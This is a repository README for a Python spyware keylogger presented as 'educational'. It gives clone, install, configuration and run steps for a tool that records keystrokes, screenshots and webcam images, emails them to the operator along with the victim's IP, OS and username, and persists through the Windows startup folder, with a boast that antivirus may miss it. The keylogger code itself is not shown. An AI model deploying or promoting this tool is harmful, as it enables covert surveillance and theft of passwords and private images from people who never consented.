# Spyware Keylogger - Educational Purposes Only

## Introduction
This Python script is a keylogger designed for educational purposes only. It logs keystrokes, takes screenshots, captures webcam images, and sends these logs to a specified email address. It also adds itself to the startup folder to ensure it runs whenever the computer starts.

**Warning:** This is dangerous spyware, and many antivirus programs may fail to detect it. Use this script responsibly and only in environments where you have explicit permission to do so.

## Features
- Logs all keystrokes
- Takes a screenshot every 30 key presses
- Captures a webcam image every 30 key presses
- Emails the log file, screenshot, and webcam image to a specified email address
- Adds itself to the startup folder to run on system startup

## Requirements
- Python 3.x
- Required Python libraries:
  - `keyboard`
  - `datetime`
  - `os`
  - `smtplib`
  - `email`
  - `winshell`
  - `sys`
  - `socket`
  - `getpass`
  - `platform`
  - `pyautogui`
  - `cv2`

## Installation and Setup
1. **Clone the Repository:**
   ```bash
   git clone https://github.com/Mohamed1242012/spyware.git
   cd spyware
   ```

2. **Install Required Libraries:**
   Install the required Python libraries using pip:
   ```bash
   pip install keyboard pyautogui winshell opencv-python
   ```

3. **Configure the Script:**
   - Open the script file in a text editor.
   - Set your sender email, receiver email, and SMTP server login credentials in the `send_email` function:
     ```python
     sender_email = "your_email@example.com"  # your email
     receiver_email = "receiver_email@example.com"  # send data to this email
     server.login(sender_email, "your_app_key")  # app key
     ```

## Usage
1. **Run the Script:**
   ```bash
   python keylogger.py
   ```

2. The script will start logging keystrokes and will take a screenshot and webcam image every 30 key presses. These logs, screenshots, and images will be sent to the specified email address.

## How It Works
1. **Logging Keystrokes:**
   The script uses the `keyboard` library to hook keyboard events and log each keystroke along with a timestamp.

2. **Taking Screenshots and Webcam Images:**
   Every 30 keystrokes, the script takes a screenshot using `pyautogui` and a webcam image using `cv2`.

3. **Sending Logs via Email:**
   The script uses the `smtplib` library to send an email with the log file, screenshot, and webcam image as attachments. The email includes the IP address, OS, and username of the machine running the script.

4. **Persisting Across Reboots:**
   The script creates a shortcut in the Windows startup folder to ensure it runs every time the system starts.

## Disclaimer
This script is intended for educational purposes only. Unauthorized use of keyloggers is illegal and unethical. Use this script only in environments where you have explicit permission to do so. The author of this script is not responsible for any misuse or damage caused by this software.
